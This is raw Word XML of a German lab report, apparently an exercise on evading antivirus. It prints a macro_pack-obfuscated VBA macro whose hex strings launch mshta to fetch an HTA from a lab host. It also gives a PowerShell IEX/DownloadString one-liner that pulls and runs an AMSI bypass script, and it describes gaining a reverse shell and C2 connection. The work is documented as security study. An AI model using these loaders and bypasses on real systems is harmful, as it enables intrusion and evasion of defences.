      </w:r>
      <w:r w:rsidR="00A47C33">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="006B3288">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Diese lud ich von folgendem Github Repository herunter:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10C5C90E" w14:textId="77777777" w:rsidR="006B3288" w:rsidRDefault="006B3288" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5B0CA8B9" w14:textId="5914E295" w:rsidR="006B3288" w:rsidRPr="006B3288" w:rsidRDefault="00DE67E4" w:rsidP="006B3288">
      <w:pPr>
        <w:pStyle w:val="Listenabsatz"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="41"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId24" w:history="1">
        <w:r w:rsidR="006B3288" w:rsidRPr="006B3288">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:t>https://github.com/sevagas/macro_pack</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="370F78CF" w14:textId="77777777" w:rsidR="006B3288" w:rsidRDefault="006B3288" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="71EE5FF5" w14:textId="41EBD37D" w:rsidR="00BC2A48" w:rsidRDefault="00445E35" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Dieser wurde mit </w:t>
      </w:r>
      <w:r w:rsidR="0039759C">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>dem Befehl „</w:t>
      </w:r>
      <w:r w:rsidR="0039759C" w:rsidRPr="0039759C">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>python macro_pack.py -f ./cleartext/test12.vba -o -G ./obfuscated/test12_obf.vba</w:t>
      </w:r>
      <w:r w:rsidR="0039759C">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>“ angewandt</w:t>
      </w:r>
      <w:r w:rsidR="0034227A">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (siehe Abbildung).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BB67FB8" w14:textId="134E8A37" w:rsidR="0039759C" w:rsidRPr="0039759C" w:rsidRDefault="0039759C" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="471927B0" w14:textId="62F6B2A7" w:rsidR="0039759C" w:rsidRDefault="0039759C" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1582F52B" wp14:editId="23DDC443">
            <wp:extent cx="5759450" cy="3033395"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="105" name="Grafik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59450" cy="3033395"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D30A69B" w14:textId="3A44FC2D" w:rsidR="0034227A" w:rsidRDefault="0034227A" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="038B2C35" w14:textId="361B0587" w:rsidR="0034227A" w:rsidRDefault="0034227A" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Für die Obfuskierung benutzt Makro Pack </w:t>
      </w:r>
      <w:r w:rsidR="00D907AF">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">u. A. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>folgende Techniken</w:t>
      </w:r>
      <w:r w:rsidR="000700A3">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:sdt>
        <w:sdtPr>
          <w:rPr>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:alias w:val="Don't edit this field"/>
          <w:tag w:val="CitaviPlaceholder#7b72b85b-513d-421b-88ff-94a371a7b8d9"/>
          <w:id w:val="962380408"/>
          <w:placeholder>
            <w:docPart w:val="DefaultPlaceholder_-1854013440"/>
          </w:placeholder>
        </w:sdtPr>
        <w:sdtEndPr/>
        <w:sdtContent>
          <w:r w:rsidR="000700A3">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidR="003A23EE">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:instrText>ADDIN CitaviPlaceholder{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}</w:instrText>
          </w:r>
          <w:r w:rsidR="000700A3">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:r w:rsidR="000E27AC">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t>[4]</w:t>
          </w:r>
          <w:r w:rsidR="000700A3">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:sdtContent>
      </w:sdt>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EF13246" w14:textId="697F9B7B" w:rsidR="0034227A" w:rsidRDefault="0034227A" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="24EA5F82" w14:textId="6DE5BC69" w:rsidR="0034227A" w:rsidRPr="00B54BB0" w:rsidRDefault="0034227A" w:rsidP="00B54BB0">
      <w:pPr>
        <w:pStyle w:val="Listenabsatz"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="41"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B54BB0">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Umbenennen von Funktionen und Variablen</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2179F9AA" w14:textId="49DDB2C9" w:rsidR="0034227A" w:rsidRPr="00B54BB0" w:rsidRDefault="00B54BB0" w:rsidP="00B54BB0">
      <w:pPr>
        <w:pStyle w:val="Listenabsatz"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="41"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B54BB0">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Löschen von Leerzeichen und Kommentaren</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5920A554" w14:textId="4B81EF97" w:rsidR="00B54BB0" w:rsidRDefault="00B54BB0" w:rsidP="00B54BB0">
      <w:pPr>
        <w:pStyle w:val="Listenabsatz"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="41"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B54BB0">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Encoding von Strings</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52D1637F" w14:textId="396DD21C" w:rsidR="00D907AF" w:rsidRDefault="00D907AF" w:rsidP="00D907AF">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="45223C3C" w14:textId="421EF744" w:rsidR="001E1262" w:rsidRDefault="001E1262" w:rsidP="00D907AF">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Das Output des Files lautet nun wie folgt.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1545FFAA" w14:textId="77777777" w:rsidR="001E1262" w:rsidRDefault="001E1262" w:rsidP="00D907AF">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tabellenraster"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9060"/>
      </w:tblGrid>
      <w:tr w:rsidR="001E1262" w14:paraId="4A0F2DE8" w14:textId="77777777" w:rsidTr="001E1262">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9060" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6539C196" w14:textId="77777777" w:rsidR="001E1262" w:rsidRPr="00866A18" w:rsidRDefault="001E1262" w:rsidP="001E1262">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00866A18">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Sub FünftesMakro()</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="73C4766C" w14:textId="77777777" w:rsidR="001E1262" w:rsidRPr="00866A18" w:rsidRDefault="001E1262" w:rsidP="001E1262">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00866A18">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Dim spwvkpoeydz As String</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="530012C1" w14:textId="77777777" w:rsidR="001E1262" w:rsidRPr="00866A18" w:rsidRDefault="001E1262" w:rsidP="001E1262">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00866A18">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Dim qelbcncbzud As Object</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="44DC6A54" w14:textId="77777777" w:rsidR="001E1262" w:rsidRPr="00866A18" w:rsidRDefault="001E1262" w:rsidP="001E1262">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00866A18">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>cmd1 = efrtsnfgcxuo("636d64202f63207374617274202577696e64697225") &amp; efrtsnfgcxuo("5c737973776f7736345c6d736874612e65786520687474703a2f2f31302e302e322e31313a383030302f74657374312e687461")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="56E7E7CA" w14:textId="77777777" w:rsidR="001E1262" w:rsidRPr="00866A18" w:rsidRDefault="001E1262" w:rsidP="001E1262">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00866A18">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Set qelbcncbzud = CreateObject(efrtsnfgcxuo("575363") &amp; efrtsnfgcxuo("726970742e5368656c6c"))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="19B410F8" w14:textId="77777777" w:rsidR="001E1262" w:rsidRPr="00866A18" w:rsidRDefault="001E1262" w:rsidP="001E1262">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00866A18">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>ws.Exec (cmd1)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2BFBB2BE" w14:textId="77777777" w:rsidR="001E1262" w:rsidRPr="00866A18" w:rsidRDefault="001E1262" w:rsidP="001E1262">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00866A18">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>End Sub</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7204E2C9" w14:textId="77777777" w:rsidR="001E1262" w:rsidRPr="00866A18" w:rsidRDefault="001E1262" w:rsidP="001E1262">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00866A18">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Private Function efrtsnfgcxuo(ByVal lbyagmutyzof As String) As String</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="407D28F6" w14:textId="77777777" w:rsidR="001E1262" w:rsidRPr="00866A18" w:rsidRDefault="001E1262" w:rsidP="001E1262">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00866A18">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Dim npjonrqzbysg As Long</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1C994D98" w14:textId="77777777" w:rsidR="001E1262" w:rsidRPr="00866A18" w:rsidRDefault="001E1262" w:rsidP="001E1262">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00866A18">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>For npjonrqzbysg = 1 To Len(lbyagmutyzof) Step 2</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="40428D18" w14:textId="77777777" w:rsidR="001E1262" w:rsidRPr="00866A18" w:rsidRDefault="001E1262" w:rsidP="001E1262">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00866A18">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>efrtsnfgcxuo = efrtsnfgcxuo &amp; Chr$(Val("&amp;H" &amp; Mid$(lbyagmutyzof, npjonrqzbysg, 2)))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="542BB97E" w14:textId="77777777" w:rsidR="001E1262" w:rsidRPr="001E1262" w:rsidRDefault="001E1262" w:rsidP="001E1262">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="001E1262">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>Next npjonrqzbysg</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4C112D99" w14:textId="13A0C2D1" w:rsidR="001E1262" w:rsidRDefault="001E1262" w:rsidP="001E1262">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="001E1262">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>End Function</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>t</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="28CD210D" w14:textId="77777777" w:rsidR="001E1262" w:rsidRPr="00D907AF" w:rsidRDefault="001E1262" w:rsidP="00D907AF">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F09A8DC" w14:textId="77F7D7C0" w:rsidR="0034227A" w:rsidRDefault="008E2D33" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Das obfuskierte Skript</w:t>
      </w:r>
      <w:r w:rsidR="004D58C1">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> wird dann in einem neuen Modul in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>der</w:t>
      </w:r>
      <w:r w:rsidR="004D58C1">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Excel Datei eingebaut. A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">us </w:t>
      </w:r>
      <w:r w:rsidR="001C11FA">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Gründen</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> der Lesbarkeit wird </w:t>
      </w:r>
      <w:r w:rsidR="00544B28">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">diese Vorgehensweise nicht mehr weiters beschrieben, sie wurde jedoch vor </w:t>
      </w:r>
      <w:r w:rsidR="00771EFC">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>jedem weiteren Versuch durchgeführt.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CD4F984" w14:textId="344B22B8" w:rsidR="006D241D" w:rsidRDefault="006D241D" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60704CC0" w14:textId="4CF87FF0" w:rsidR="001C11FA" w:rsidRDefault="00E63FCF" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Anschließend überlegt ich mir wie ich AMSI </w:t>
      </w:r>
      <w:r w:rsidR="00F27011">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>umgehen soll</w:t>
      </w:r>
      <w:r w:rsidR="00BE791A">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> und machte wieder die Suchmaschine an. Nach längerer Suche entdeckte ich folgendes GitHub Repository</w:t>
      </w:r>
      <w:r w:rsidR="001C11FA">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05CF947D" w14:textId="07803FDA" w:rsidR="003B620E" w:rsidRDefault="003B620E" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E1E49C3" w14:textId="6508B9DB" w:rsidR="003B620E" w:rsidRPr="003B620E" w:rsidRDefault="003B620E" w:rsidP="003B620E">
      <w:pPr>
        <w:pStyle w:val="Listenabsatz"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="42"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003B620E">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>https://github.com/aloksaurabh/OffenPowerSh/blob/master/Bypass/Invoke-AlokS-AvBypass.ps1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B682169" w14:textId="70841900" w:rsidR="00D01B88" w:rsidRDefault="00D01B88" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="16C0034D" w14:textId="4BB8360E" w:rsidR="003B620E" w:rsidRDefault="003B620E" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Um zu überprüfen, ob der AMSI Bypass funktioniert </w:t>
      </w:r>
      <w:r w:rsidR="00046B89">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>versuchte ich per PowerShell eine</w:t>
      </w:r>
      <w:r w:rsidR="00876250">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Reverse Shell zur Linux Maschine ohne AMSI Bypass, was </w:t>
      </w:r>
      <w:r w:rsidR="008B705B">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>natürlich fehlschlug</w:t>
      </w:r>
      <w:r w:rsidR="00097E73">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (siehe Abbildung).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74FE9D5C" w14:textId="66E7D04D" w:rsidR="00097E73" w:rsidRDefault="00097E73" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="662EF9CE" w14:textId="5FA16A10" w:rsidR="00097E73" w:rsidRDefault="00097E73" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4E6EC745" wp14:editId="10D2ED24">
            <wp:extent cx="5759450" cy="1015365"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="120" name="Grafik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59450" cy="1015365"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="03445BD8" w14:textId="06E04257" w:rsidR="003B620E" w:rsidRDefault="003B620E" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="645DC949" w14:textId="120E0A17" w:rsidR="00097E73" w:rsidRDefault="00097E73" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00041F9C">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Als nächstes </w:t>
      </w:r>
      <w:r w:rsidR="00041F9C" w:rsidRPr="00041F9C">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>führte ich d</w:t>
      </w:r>
      <w:r w:rsidR="00041F9C">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>as AMSI Bypass Skript mit folgendem Befehl aus</w:t>
      </w:r>
      <w:r w:rsidR="00E65C85">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7990619C" w14:textId="0D1E32A6" w:rsidR="00041F9C" w:rsidRPr="00041F9C" w:rsidRDefault="00041F9C" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1DD34E99" w14:textId="717EF8E3" w:rsidR="00D01B88" w:rsidRPr="00041F9C" w:rsidRDefault="00D01B88" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00041F9C">
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
        <w:t>IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/aloksaurabh/OffenPowerSh/master/Bypass/Invoke-AlokS-AvBypass.ps1');Invoke-AlokS-AvBypass;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2559CB83" w14:textId="3FA5DEFC" w:rsidR="006D241D" w:rsidRDefault="006D241D" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="59684016" w14:textId="539DBB67" w:rsidR="00E65C85" w:rsidRPr="006964F0" w:rsidRDefault="00E65C85" w:rsidP="00A83FAD">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006964F0">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Anschließend führte ich </w:t>
      </w:r>
      <w:r w:rsidR="006964F0" w:rsidRPr="006964F0">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>wieder d</w:t>
      </w:r>
      <w:r w:rsidR="006964F0">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>en zuvor benutzten Befehl für die Shell aus, diese</w:t>
      </w:r>
      <w:r w:rsidR="00D732D6">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r w:rsidR="006964F0">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> konnte nun erfolgreich ohne AV Meldung </w:t>
      </w:r>
      <w:r w:rsidR="00D732D6">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>ausgeführt werden.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="711A3523" w14:textId="765ACFAE" w:rsidR="00041F9C" w:rsidRPr="00041F9C" w:rsidRDefault="00041F9C" w:rsidP="00A83FAD">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="14DE485D" wp14:editId="2451CF85">
            <wp:extent cx="5759450" cy="915670"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="125" name="Grafik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59450" cy="915670"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="12C1C976" w14:textId="77777777" w:rsidR="006E03A9" w:rsidRPr="00041F9C" w:rsidRDefault="006E03A9" w:rsidP="00A83FAD">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-NZ"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2E9780C2" w14:textId="0D98047F" w:rsidR="00041F9C" w:rsidRDefault="00930DCC" w:rsidP="00A83FAD">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00930DCC">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Davor wurde natürlich auf d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">er Maschine des Angreifers ein Listener gestartet, </w:t>
      </w:r>
      <w:r w:rsidR="00182E02">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">nach der Ausführung des Befehls auf dem </w:t>
      </w:r>
      <w:r w:rsidR="003F3C95">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Windows System erhielt ich eine C2 Verbindung (siehe Abbildung).</w:t>
      </w:r>
    </w:p>
